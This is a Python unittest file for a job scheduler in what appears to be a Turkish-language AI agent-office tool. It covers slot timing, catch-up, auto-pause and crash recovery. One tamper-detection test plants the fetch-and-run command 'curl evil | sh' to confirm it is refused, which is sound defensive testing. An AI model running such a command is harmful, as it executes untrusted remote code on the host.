"""Tests for scheduled jobs (phase 6, bin/zamanla.py): the `ofis.py zamanla` commands, the server's scheduler pass
(due slots, catch-up, one open run, auto-pause, queue limit, idempotency), the display note and the page state.
Fake claude, temp vault/durum only; the clock is a variable."""
import io
import json
import os
import sys
import tempfile
import unittest
from datetime import datetime, timedelta

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "bin"))
sys.path.insert(0, HERE)
import ceo  # noqa: E402
import claude_cli  # noqa: E402
import fakes  # noqa: E402
import jobs  # noqa: E402
import kontrol  # noqa: E402
import launch  # noqa: E402
import ofis  # noqa: E402
import postoffice  # noqa: E402
import records  # noqa: E402
import zamanla  # noqa: E402

WED = datetime(2026, 11, 11, 8, 0, 0)  # a Wednesday


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = os.path.realpath(self.tmp.name)
        self.root = os.path.join(base, "ajan-ofisi")
        self.durum = os.path.join(self.root, "durum")
        self.blog = os.path.join(base, "Dev", "blog")
        self.vault = os.path.join(base, "vault", "OFIS")
        self.projects_dir = os.path.join(base, "projects")
        for d in (self.root, self.blog, self.vault, os.path.join(self.durum, "taslak")):
            os.makedirs(d)
        self.fake = fakes.FakeClaude(os.path.join(base, "fake"))
        self.cfg = {"ceo_session": "ofis-ceo", "vault_ofis": self.vault, "default_budget_usd": 3,
                    "projects": {"blog": {"path": self.blog}},
                    "tiers": {"genel": {"model": "sonnet", "effort": "medium"},
                              "kod": {"model": "opus", "effort": "high"}},
                    "max_running": 3, "max_running_per_project": 5}
        self.cli = claude_cli.ClaudeCLI(claude_bin=self.fake.path, cache_seconds=0)
        self.t = 1000.0
        self.now = WED
        self.kw = {"clock": lambda: self.t, "sleep": lambda s: None, "find_attempts": 3}
        self.ceo = ceo.CeoController(self.cli, self.root, "ofis-ceo", self.durum, self.projects_dir, **self.kw)
        self.log = io.StringIO()
        self.po = self.new_postoffice()

    def new_postoffice(self):
        return postoffice.PostOffice(self.cfg, self.cli, self.ceo, self.durum, self.projects_dir,
                                     now=lambda: self.now, channel_kwargs=self.kw, log=self.log,
                                     clock=lambda: self.t)

    def tearDown(self):
        self.tmp.cleanup()

    # --- helpers ---

    def run_cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        code = ofis.main(["ofis.py", *argv], cfg=self.cfg, durum_dir=self.durum, claude_bin=self.fake.path,
                         now=lambda: self.now, out=out, err=err, cwd=self.root)
        return code, out.getvalue(), err.getvalue()

    def ok(self, *argv):
        code, out, err = self.run_cli(*argv)
        self.assertEqual(code, 0, err)
        return json.loads(out) if out.startswith("{") else out

    def refused(self, *argv):
        code, out, err = self.run_cli(*argv)
        self.assertEqual(code, 1, out)
        self.assertTrue(err.startswith("REFUSED: "), err)
        return err

    def schedule(self, ad="gunluk", *extra, saat="09:00", hedef="Testleri çalıştır ve raporla."):
        return self.ok("zamanla", "ekle", "--ad", ad, "--proje", "blog", "--baslik", f"Günlük {ad}",
                       "--hedef", hedef, "--saat", saat, *extra)

    def definition(self, ad="gunluk"):
        with open(os.path.join(self.durum, "zamanlanmis", f"{ad}.json"), encoding="utf-8") as f:
            return json.load(f)

    def write_definition(self, data):
        with open(os.path.join(self.durum, "zamanlanmis", f"{data['ad']}.json"), "w", encoding="utf-8") as f:
            json.dump(data, f)

    def note(self, ad="gunluk"):
        with open(os.path.join(self.vault, "Zamanlanmis", f"{ad}.md"), encoding="utf-8") as f:
            return f.read()

    def all_jobs(self):
        return sorted(jobs.list_jobs(self.vault), key=lambda j: j.name)

    def at(self, when):
        self.now = when
        self.t += 10
        return self.po.dispatch()

    def finish(self, name, status):
        """Ends a run's job the way the server would (status, bitis)."""
        jobs.update(self.vault, name, status=status, fields={"bitis": f"{self.now:%Y-%m-%dT%H:%M:%S}"})

    def ceo_queue(self):
        return [q["text"] for q in self.ceo.queue()]


class CommandTest(Base):
    def test_ekle_stores_a_trusted_definition_and_a_display_note_without_adding_a_job(self):
        out = self.schedule("gunluk", "--kontrol", "pytest -q", "--gunler", "pzt,car,cum")
        self.assertEqual(out["ad"], "gunluk")
        d = self.definition()
        self.assertEqual(d["proje"], "blog")
        self.assertEqual(d["brief"]["hedef"], "Testleri çalıştır ve raporla.")
        self.assertEqual(d["kontrol"], "pytest -q")
        self.assertEqual(d["kontrol_ozet"], jobs.kontrol_digest("pytest -q"))
        self.assertEqual(d["saat"], "09:00")
        self.assertEqual(d["gunler"], ["pzt", "car", "cum"])
        self.assertEqual(d["durum"], "etkin")
        self.assertEqual(d["butce_usd"], "3")  # the default budget, fixed when the owner approved it
        self.assertEqual(d["katman"], "genel")
        self.assertEqual(self.all_jobs(), [])
        note = self.note()
        self.assertIn("blog", note)
        self.assertIn("09:00", note)
        self.assertIn("Sonraki koşu", note)
        self.assertIn("11 Kasım 2026", note)  # today 09:00 is still ahead (08:00 now)

    def test_ekle_refuses_like_ekle(self):
        self.assertIn("registry", self.refused("zamanla", "ekle", "--ad", "x", "--proje", "yok", "--baslik", "B",
                                               "--hedef", "H", "--saat", "09:00"))
        self.assertIn("kontrolsüz", self.refused("zamanla", "ekle", "--ad", "x", "--proje", "blog", "--baslik",
                                                 "B", "--hedef", "H", "--saat", "09:00", "--katman", "kod"))
        self.assertIn("forbidden path", self.refused("zamanla", "ekle", "--ad", "x", "--proje", "blog", "--baslik",
                                                     "B", "--hedef", "H", "--saat", "09:00", "--kontrol",
                                                     "ls ~/Dev/zim"))
        self.refused("zamanla", "ekle", "--ad", "x", "--proje", "blog", "--baslik", "B", "--hedef", "H",
                     "--saat", "09:00", "--butce", "5000")
        for bad in ("25:00", "9", "09:60", "nine"):
            with self.subTest(saat=bad):
                self.refused("zamanla", "ekle", "--ad", "x", "--proje", "blog", "--baslik", "B", "--hedef", "H",
                             "--saat", bad)
        self.refused("zamanla", "ekle", "--ad", "x", "--proje", "blog", "--baslik", "B", "--hedef", "H",
                     "--saat", "09:00", "--gunler", "pzt,xyz")
        for bad in ("Kötü Ad", "-x", "a/b", "x" * 41):
            with self.subTest(ad=bad):
                self.refused("zamanla", "ekle", "--ad", bad, "--proje", "blog", "--baslik", "B", "--hedef", "H",
                             "--saat", "09:00")
        self.assertFalse(os.path.isdir(os.path.join(self.durum, "zamanlanmis")) and
                         os.listdir(os.path.join(self.durum, "zamanlanmis")))

    def test_a_zim_project_is_refused(self):
        zim = os.path.join(os.path.dirname(self.blog), "zim")
        os.makedirs(zim)
        self.cfg["projects"]["isyeri"] = {"path": zim}
        self.assertIn("forbidden path", self.refused("zamanla", "ekle", "--ad", "x", "--proje", "isyeri", "--baslik",
                                                     "B", "--hedef", "H", "--saat", "09:00"))

    def test_a_name_is_never_reused_even_after_sil(self):
        self.schedule("gunluk")
        self.assertIn("gunluk", self.refused("zamanla", "ekle", "--ad", "gunluk", "--proje", "blog", "--baslik",
                                             "B", "--hedef", "H", "--saat", "10:00"))
        self.ok("zamanla", "sil", "gunluk")
        self.refused("zamanla", "ekle", "--ad", "gunluk", "--proje", "blog", "--baslik", "B", "--hedef", "H",
                     "--saat", "10:00")

    def test_brief_file(self):
        path = os.path.join(self.durum, "taslak", "z-1.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"ad": "haftalik", "proje": "blog", "baslik": "Haftalık bakım", "hedef": "Bağımlılıkları "
                       "kontrol et.", "saat": "07:30", "gunler": ["pzt"], "butce": 1.5, "kontrol": "true"}, f)
        out = self.ok("zamanla", "ekle", "--brief-dosya", "durum/taslak/z-1.json")
        self.assertEqual(out["ad"], "haftalik")
        d = self.definition("haftalik")
        self.assertEqual((d["saat"], d["gunler"], d["butce_usd"], d["kontrol"]), ("07:30", ["pzt"], "1.5", "true"))
        self.assertFalse(os.path.exists(path))  # deleted on success

    def test_brief_file_with_an_unknown_field_is_refused_and_kept(self):
        path = os.path.join(self.durum, "taslak", "z-2.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"ad": "x", "proje": "blog", "baslik": "B", "hedef": "H", "saat": "07:30", "bagimli": "a"},
                      f)
        self.assertIn("bagimli", self.refused("zamanla", "ekle", "--brief-dosya", "durum/taslak/z-2.json"))
        self.assertTrue(os.path.exists(path))

    def test_durdur_devam_sil(self):
        self.schedule("gunluk")
        self.assertEqual(self.ok("zamanla", "durdur", "gunluk")["durum"], "durduruldu")
        self.assertEqual(self.definition()["durum"], "durduruldu")
        self.assertIn("duraklatıldı", self.note())
        self.refused("zamanla", "durdur", "gunluk")
        self.assertEqual(self.ok("zamanla", "devam", "gunluk")["durum"], "etkin")
        self.refused("zamanla", "devam", "gunluk")
        self.assertEqual(self.ok("zamanla", "sil", "gunluk")["durum"], "kaldirildi")
        self.assertTrue(os.path.exists(os.path.join(self.durum, "zamanlanmis", "gunluk.json")))  # history kept
        self.assertIn("kaldırıldı", self.note())
        self.refused("zamanla", "devam", "gunluk")
        self.refused("zamanla", "durdur", "gunluk")
        self.refused("zamanla", "sil", "gunluk")
        self.refused("zamanla", "durdur", "yok-boyle")

    def test_listele(self):
        self.schedule("gunluk")
        self.schedule("aksam", saat="18:30")
        self.ok("zamanla", "durdur", "aksam")
        out = self.ok("zamanla", "listele")
        self.assertIn("gunluk", out)
        self.assertIn("aksam", out)
        self.assertIn("duraklatıldı", out)
        self.assertIn("2026-11-11 09:00", out)

    def test_zamanla_is_denied_to_project_sessions_and_documented(self):
        self.assertIn("zamanla", launch.DENIED_COMMANDS)
        self.assertIn("zamanla", ofis.__doc__)


class SchedulerTest(Base):
    def test_nothing_before_the_time_then_one_job_at_the_time_started_by_the_dispatcher(self):
        self.schedule("gunluk", "--kontrol", "pytest -q")
        self.at(WED.replace(hour=8, minute=59))
        self.assertEqual(self.all_jobs(), [])
        started = self.at(WED.replace(hour=9, minute=0, second=3))
        made = self.all_jobs()
        self.assertEqual(len(made), 1)
        job = made[0]
        self.assertEqual(started, [job.name])  # the same pass starts it
        self.assertEqual(records.server_value(self.durum, job.name, "grup"), "gunluk-20261111-0900")
        self.assertEqual(job.meta.get("zamanlama"), "gunluk")
        self.assertEqual(kontrol.load(self.durum, job.name), "pytest -q")
        self.assertEqual(kontrol.load_brief(self.durum, job.name)["grup"], "gunluk-20261111-0900")
        d = self.definition()
        self.assertEqual(d["son_slot"], "2026-11-11T09:00")
        self.assertEqual([r["is"] for r in d["kosular"]], [job.name])
        self.assertIn(f"[[{jobs.stem(job.name)}]]", self.note())
        self.assertIn("12 Kasım 2026", self.note())  # next run
        # later passes in the same slot add nothing
        self.at(WED.replace(hour=9, minute=5))
        self.at(WED.replace(hour=13))
        self.assertEqual(len(self.all_jobs()), 1)

    def test_an_explicit_specialisation_reaches_every_run(self):
        # plan "Sonraki iş (9)" step 2: the definition keeps --uzmanlik; each run's ekle gets it
        self.schedule("gunluk", "--uzmanlik", "ui")
        self.assertEqual(self.definition()["uzmanlik"], "ui")
        self.at(WED.replace(hour=9, minute=1))
        job = self.all_jobs()[0]
        rec = records.load(self.durum, job.name)
        self.assertEqual((rec["uzmanlik"], rec["uzmanlik_kaynagi"]), ("ui", "elle"))

    def test_an_old_definition_without_a_specialisation_still_runs_and_is_routed(self):
        self.schedule("gunluk", hedef="Sunucu API uçlarının testlerini çalıştır ve raporla.")
        old = self.definition()
        del old["uzmanlik"]  # a definition written before step 2
        self.write_definition(old)
        self.po = self.new_postoffice()
        self.at(WED.replace(hour=9, minute=1))
        jobs_now = self.all_jobs()
        self.assertEqual(len(jobs_now), 1)
        rec = records.load(self.durum, jobs_now[0].name)
        self.assertEqual((rec["uzmanlik"], rec["uzmanlik_kaynagi"]), ("backend", "kural"))

    def test_state_survives_a_restart(self):
        self.schedule("gunluk")
        self.at(WED.replace(hour=9, minute=1))
        self.po = self.new_postoffice()  # a new server process
        self.at(WED.replace(hour=9, minute=2))
        self.assertEqual(len(self.all_jobs()), 1)

    def test_weekdays(self):
        self.schedule("pazartesi", "--gunler", "pzt")
        self.at(WED.replace(hour=9, minute=1))
        self.assertEqual(self.all_jobs(), [])
        self.at(datetime(2026, 11, 16, 9, 1))  # Monday
        self.assertEqual(len(self.all_jobs()), 1)

    def test_a_slot_before_the_schedule_was_added_never_runs(self):
        self.now = WED.replace(hour=10)
        self.schedule("gunluk")  # 09:00 already passed today
        self.at(WED.replace(hour=10, minute=1))
        self.assertEqual(self.all_jobs(), [])
        self.at(datetime(2026, 11, 12, 9, 0, 30))
        self.assertEqual(len(self.all_jobs()), 1)

    def test_an_open_previous_run_skips_the_slot(self):
        self.schedule("gunluk")
        self.at(WED.replace(hour=9, minute=1))
        self.at(datetime(2026, 11, 12, 9, 1))  # yesterday's job still runs
        self.assertEqual(len(self.all_jobs()), 1)
        d = self.definition()
        self.assertEqual(d["son_slot"], "2026-11-12T09:00")
        self.assertEqual(d["atlananlar"][-1]["slot"], "2026-11-12T09:00")
        self.assertIn("önceki koşu", d["atlananlar"][-1]["neden"])
        self.assertIn("skipped", self.log.getvalue())
        self.assertIn("atlandı", self.note())
        first = self.all_jobs()[0].name
        self.finish(first, "bitti")
        self.at(datetime(2026, 11, 12, 9, 30))  # the skipped slot is not run late
        self.assertEqual(len(self.all_jobs()), 1)
        self.at(datetime(2026, 11, 13, 9, 1))
        self.assertEqual(len(self.all_jobs()), 2)

    def test_catch_up_once_within_24_hours(self):
        self.schedule("gunluk")
        # the computer was off from Tuesday evening to Saturday 08:00: only Friday 09:00 (23 h ago) is caught up
        self.at(datetime(2026, 11, 14, 8, 0))
        made = self.all_jobs()
        self.assertEqual(len(made), 1)
        self.assertEqual(records.server_value(self.durum, made[0].name, "grup"), "gunluk-20261113-0900")
        self.finish(made[0].name, "bitti")
        self.at(datetime(2026, 11, 14, 8, 30))
        self.assertEqual(len(self.all_jobs()), 1)
        self.at(datetime(2026, 11, 14, 9, 0))
        self.assertEqual(len(self.all_jobs()), 2)

    def test_a_run_missed_more_than_24_hours_ago_is_not_caught_up(self):
        self.schedule("haftalik", "--gunler", "car")
        self.at(datetime(2026, 11, 13, 10, 0))  # Friday: Wednesday 09:00 is 49 h old
        self.assertEqual(self.all_jobs(), [])
        d = self.definition("haftalik")
        self.assertEqual(d["son_slot"], "2026-11-11T09:00")
        self.assertIn("kaçırıldı", d["atlananlar"][-1]["neden"])
        self.at(datetime(2026, 11, 18, 9, 0))
        self.assertEqual(len(self.all_jobs()), 1)

    def test_a_paused_schedule_adds_nothing_and_devam_does_not_run_old_slots(self):
        self.schedule("gunluk")
        self.ok("zamanla", "durdur", "gunluk")
        self.at(WED.replace(hour=9, minute=1))
        self.assertEqual(self.all_jobs(), [])
        self.now = WED.replace(hour=9, minute=30)
        self.ok("zamanla", "devam", "gunluk")
        self.at(WED.replace(hour=9, minute=31))
        self.assertEqual(self.all_jobs(), [])
        self.at(datetime(2026, 11, 12, 9, 0))
        self.assertEqual(len(self.all_jobs()), 1)

    def test_two_failed_runs_in_a_row_pause_the_schedule_with_one_notice(self):
        self.schedule("gunluk")
        days = [datetime(2026, 11, d, 9, 1) for d in (11, 12, 13, 14, 15)]
        self.at(days[0])
        self.finish(self.all_jobs()[-1].name, "tikandi")
        self.at(days[1])
        self.assertEqual(self.definition()["durum"], "etkin")  # one failure only
        self.finish(sorted(self.all_jobs(), key=lambda j: j.meta["olusturuldu"])[-1].name, "basarisiz")
        self.at(days[1].replace(minute=5))
        d = self.definition()
        self.assertEqual(d["durum"], "durduruldu")
        self.assertIn("2", d["durdurma_nedeni"])
        notices = [t for t in self.ceo_queue() if "gunluk" in t and "duraklatıldı" in t]
        self.assertEqual(len(notices), 1, self.ceo_queue())
        self.assertIn("Selin", notices[0])
        self.at(days[2])
        self.at(days[2].replace(minute=9))
        self.assertEqual(len(self.all_jobs()), 2)
        self.assertEqual(len([t for t in self.ceo_queue() if "duraklatıldı" in t]), 1)
        # The owner lets it go on: the old failures no longer count
        self.now = days[2].replace(minute=30)
        self.ok("zamanla", "devam", "gunluk")
        self.at(days[3])
        self.assertEqual(len(self.all_jobs()), 3)
        self.assertEqual(self.definition()["durum"], "etkin")

    def test_bitti_resets_and_iptal_does_not_count(self):
        self.schedule("gunluk")
        order = []
        for day, end in ((11, "tikandi"), (12, "bitti"), (13, "tikandi"), (14, "iptal"), (15, "tikandi")):
            self.at(datetime(2026, 11, day, 9, 1))
            new = [j for j in self.all_jobs() if j.name not in order]
            self.assertEqual(len(new), 1, day)
            order.append(new[0].name)
            self.finish(new[0].name, end)
            self.at(datetime(2026, 11, day, 9, 2))
        d = self.definition()
        self.assertEqual(d["durum"], "durduruldu")  # tikandi, (iptal ignored), tikandi
        self.assertEqual(len(self.all_jobs()), 5)

    def test_an_escalated_run_is_followed_to_its_replacement(self):
        self.schedule("gunluk")
        self.at(WED.replace(hour=9, minute=1))
        first = self.all_jobs()[0].name
        self.finish(first, "tikandi")
        replacement = launch.create_job(self.cfg, "blog", "Yükseltilmiş", {"hedef": "Yap."},
                                        now=WED.replace(hour=12), durum_dir=self.durum).name
        records.update(self.durum, first, {"yukseltildi": replacement})
        self.at(datetime(2026, 11, 12, 9, 1))
        self.assertEqual(len(self.all_jobs()), 2)  # the replacement is open: the slot is skipped
        self.assertIn("önceki koşu", self.definition()["atlananlar"][-1]["neden"])
        self.assertEqual(self.definition()["durum"], "etkin")  # an escalation is not a failure

    def test_a_full_queue_is_retried_and_told_once(self):
        self.cfg["max_queued_per_project"] = 1
        self.cfg["max_running"] = 1
        busy = launch.create_job(self.cfg, "blog", "Uzun iş", {"hedef": "Yap."}, now=WED,
                                 durum_dir=self.durum).name
        jobs.update(self.vault, busy, status="calisiyor")  # takes the running slot
        other = self.ok("ekle", "--proje", "blog", "--baslik", "Bekleyen", "--hedef", "Yap.")["is"]
        self.schedule("gunluk")
        self.at(WED.replace(hour=9, minute=1))
        self.at(WED.replace(hour=9, minute=2))
        self.assertEqual(len(self.all_jobs()), 2)
        told = [t for t in self.ceo_queue() if "gunluk" in t]
        self.assertEqual(len(told), 1, self.ceo_queue())
        self.assertIn("Sıradakiler dolu", told[0])
        self.assertEqual(self.definition().get("son_slot", ""), "")  # not consumed: retried
        self.ok("iptal", other)
        self.at(WED.replace(hour=9, minute=3))
        self.assertEqual(len(self.all_jobs()), 3)
        self.assertEqual(self.definition()["son_slot"], "2026-11-11T09:00")

    def test_a_refused_add_is_retried_at_most_once_a_minute(self):
        self.cfg["max_queued_per_project"] = 1
        self.cfg["max_running"] = 1
        busy = launch.create_job(self.cfg, "blog", "Uzun iş", {"hedef": "Yap."}, now=WED,
                                 durum_dir=self.durum).name
        jobs.update(self.vault, busy, status="calisiyor")
        other = self.ok("ekle", "--proje", "blog", "--baslik", "Bekleyen", "--hedef", "Yap.")["is"]
        self.schedule("gunluk")
        self.at(WED.replace(hour=9, minute=1, second=0))
        self.ok("iptal", other)
        self.at(WED.replace(hour=9, minute=1, second=30))
        self.assertEqual(len(self.all_jobs()), 2)  # not tried again yet
        self.at(WED.replace(hour=9, minute=2, second=1))
        self.assertEqual(len(self.all_jobs()), 3)

    def test_an_unreadable_vault_never_marks_a_run_gone(self):
        # review finding 1: macOS privacy may refuse the vault for a while; a running run must stay open
        self.schedule("gunluk")
        self.at(WED.replace(hour=9, minute=1))
        isler = os.path.join(self.vault, "Isler")
        os.chmod(isler, 0)
        try:
            self.at(WED.replace(hour=9, minute=2))
        finally:
            os.chmod(isler, 0o755)
        self.assertEqual(self.definition()["kosular"][0]["sonuc"], "")
        self.assertIsNotNone(self.po.schedules.last_error)
        self.at(datetime(2026, 11, 12, 9, 1))  # yesterday's run still works: skipped, no second job
        self.assertEqual(len(self.all_jobs()), 1)

    def test_a_run_once_seen_gone_is_checked_again(self):
        self.schedule("gunluk")
        self.at(WED.replace(hour=9, minute=1))
        d = self.definition()
        d["kosular"][0]["sonuc"] = "yok"
        self.write_definition(d)
        self.at(datetime(2026, 11, 12, 9, 1))
        self.assertEqual(len(self.all_jobs()), 1)
        self.assertEqual(self.definition()["kosular"][0]["sonuc"], "")

    def test_a_stale_open_slot_is_adopted_before_the_next_slot(self):
        # review finding 3: crash after the add, server back only the next day
        self.schedule("gunluk")
        d = self.definition()
        d["acik_slot"] = "2026-11-11T09:00"
        self.write_definition(d)
        orphan = jobs.create(self.vault, "blog", "Günlük gunluk", now=WED.replace(hour=9, second=2),
                             fields={"grup": "gunluk-20261111-0900", "katman": "genel"},
                             brief={"hedef": "Testleri çalıştır ve raporla."})
        jobs.update(self.vault, orphan.name, status="calisiyor")
        self.at(datetime(2026, 11, 12, 9, 1))
        self.at(datetime(2026, 11, 12, 9, 2))
        self.assertEqual(len(self.all_jobs()), 1)
        self.assertEqual([r["is"] for r in self.definition()["kosular"]], [orphan.name])

    def test_a_refused_adoption_never_stops_the_dispatcher(self):
        # review finding 4: an exception from one schedule must not skip the dispatcher pass
        self.schedule("gunluk")
        d = self.definition()
        d["katman"] = "silinmis-katman"
        d["acik_slot"] = "2026-11-11T09:00"
        self.write_definition(d)
        jobs.create(self.vault, "blog", "Günlük gunluk", now=WED.replace(hour=9, second=2),
                    fields={"grup": "gunluk-20261111-0900"}, brief={"hedef": "Yap."})
        other = self.ok("ekle", "--proje", "blog", "--baslik", "Başka", "--hedef", "Yap.")["is"]
        started = self.at(WED.replace(hour=9, minute=1))
        self.assertIn(other, started)
        self.assertIsNotNone(self.po.schedules.last_error)

    def test_a_crash_after_the_job_was_added_never_adds_a_second_one(self):
        self.schedule("gunluk", "--kontrol", "pytest -q")
        real = zamanla._save

        def crash(durum_dir, data):
            if data.get("kosular"):
                raise OSError("disk full")
            return real(durum_dir, data)
        zamanla._save = crash
        try:
            self.at(WED.replace(hour=9, minute=1))
        finally:
            zamanla._save = real
        self.assertEqual(len(self.all_jobs()), 1)
        self.at(WED.replace(hour=9, minute=2))
        self.assertEqual(len(self.all_jobs()), 1)
        self.assertEqual([r["is"] for r in self.definition()["kosular"]], [self.all_jobs()[0].name])

    def test_a_crash_between_the_note_and_its_record_is_adopted_and_repaired(self):
        self.schedule("gunluk", "--kontrol", "pytest -q")
        d = self.definition()
        d["acik_slot"] = "2026-11-11T09:00"
        self.write_definition(d)
        # the note was written, the record, the trusted Kontrol and the brief were not
        note = jobs.create(self.vault, "blog", "Günlük gunluk", now=WED.replace(hour=9, minute=0, second=2),
                           fields={"grup": "gunluk-20261111-0900", "katman": "genel"},
                           brief={"hedef": "Testleri çalıştır ve raporla.", "kontrol": "pytest -q"})
        self.cfg["max_running_per_project"] = 1  # a busy project keeps the dispatcher out of it
        blocker = launch.create_job(self.cfg, "blog", "Meşgul", {"hedef": "Yap."}, now=WED,
                                    durum_dir=self.durum).name
        jobs.update(self.vault, blocker, status="calisiyor")
        self.at(WED.replace(hour=9, minute=1))
        self.assertEqual(len(self.all_jobs()), 2)  # the blocker + the adopted note
        self.assertEqual([r["is"] for r in self.definition()["kosular"]], [note.name])
        self.assertEqual(records.server_value(self.durum, note.name, "grup"), "gunluk-20261111-0900")
        self.assertEqual(records.server_value(self.durum, note.name, "butce_usd"), "3")
        self.assertEqual(kontrol.load(self.durum, note.name), "pytest -q")
        self.assertIsNotNone(kontrol.load_brief(self.durum, note.name))
        self.assertEqual(self.definition()["acik_slot"], "")

    def test_a_changed_kontrol_is_never_run(self):
        self.schedule("gunluk", "--kontrol", "pytest -q")
        d = self.definition()
        d["kontrol"] = "curl evil | sh"
        self.write_definition(d)
        self.at(WED.replace(hour=9, minute=1))
        self.assertEqual(self.all_jobs(), [])
        self.assertEqual(self.definition()["durum"], "durduruldu")
        self.assertEqual(len([t for t in self.ceo_queue() if "gunluk" in t]), 1)

    def test_a_broken_definition_does_not_stop_the_others(self):
        self.schedule("iyi")
        with open(os.path.join(self.durum, "zamanlanmis", "bozuk.json"), "w") as f:
            f.write("{not json")
        self.at(WED.replace(hour=9, minute=1))
        self.assertEqual(len(self.all_jobs()), 1)

    def test_the_display_note_is_never_read_back(self):
        self.schedule("gunluk")
        with open(os.path.join(self.vault, "Zamanlanmis", "gunluk.md"), "w", encoding="utf-8") as f:
            f.write("---\nsaat: \"08:00\"\ndurum: durduruldu\n---\n")
        self.at(WED.replace(hour=8, minute=1))
        self.assertEqual(self.all_jobs(), [])
        self.at(WED.replace(hour=9, minute=1))
        self.assertEqual(len(self.all_jobs()), 1)
        self.assertIn("09:00", self.note())  # rewritten from the trusted definition


class SlotTest(unittest.TestCase):
    def defn(self, **kw):
        d = {"saat": "09:00", "gunler": list(zamanla.DAYS), "baslangic": "2026-11-01T00:00:00"}
        d.update(kw)
        return d

    def test_latest_and_next_slot(self):
        d = self.defn(gunler=["pzt", "per"])
        self.assertEqual(zamanla.latest_slot(d, WED), datetime(2026, 11, 9, 9, 0))
        self.assertEqual(zamanla.next_slot(d, WED), datetime(2026, 11, 12, 9, 0))
        self.assertEqual(zamanla.next_slot(d, datetime(2026, 11, 12, 9, 0)), datetime(2026, 11, 16, 9, 0))
        self.assertIsNone(zamanla.latest_slot(self.defn(baslangic="2026-11-11T08:30:00"), WED))

    def test_when_text(self):
        self.assertEqual(zamanla.when_text(self.defn()), "her gün 09:00")
        self.assertEqual(zamanla.when_text(self.defn(gunler=["pzt", "sal", "car", "per", "cum"])),
                         "hafta içi her gün 09:00")
        self.assertEqual(zamanla.when_text(self.defn(gunler=["pzt", "cum"])), "Pazartesi, Cuma 09:00")


class PageStateTest(Base):
    def test_summaries_for_the_page(self):
        self.schedule("gunluk")
        self.schedule("aksam", saat="18:30")
        self.ok("zamanla", "durdur", "aksam")
        self.schedule("eski", saat="07:00")
        self.ok("zamanla", "sil", "eski")
        rows = zamanla.summaries(self.durum, WED)
        self.assertEqual([r["ad"] for r in rows], ["aksam", "gunluk"])
        gunluk = rows[1]
        self.assertEqual(gunluk["proje"], "blog")
        self.assertEqual(gunluk["sonraki"], "2026-11-11T09:00")
        self.assertFalse(gunluk["duraklatildi"])
        self.assertTrue(rows[0]["duraklatildi"])
        self.assertEqual(rows[0]["sonraki"], "")
        self.assertEqual(gunluk["kosular"], [])

    def test_summaries_carry_the_newest_runs_first_for_the_page(self):
        self.schedule("gunluk")
        d = self.definition()
        d["kosular"] = [{"slot": f"2026-11-0{i}T09:00", "is": f"2026-11-0{i}-090000-blog.md",
                         "sonuc": "bitti" if i % 2 else "tikandi", "son_is": ""} for i in range(1, 8)]
        d["kosular"][-1]["son_is"] = "2026-11-07-100000-blog.md"
        self.write_definition(d)
        [row] = zamanla.summaries(self.durum, WED)
        self.assertEqual([r["slot"] for r in row["kosular"]],
                         [f"2026-11-0{i}T09:00" for i in range(7, 2, -1)])  # PAGE_RUNS = 5, newest first
        self.assertEqual(row["kosular"][0], {"slot": "2026-11-07T09:00", "is": "2026-11-07-090000-blog.md",
                                             "sonuc": "bitti", "son_is": "2026-11-07-100000-blog.md"})
        self.assertEqual(row["son_is"], "2026-11-07-090000-blog.md")


if __name__ == "__main__":
    unittest.main()
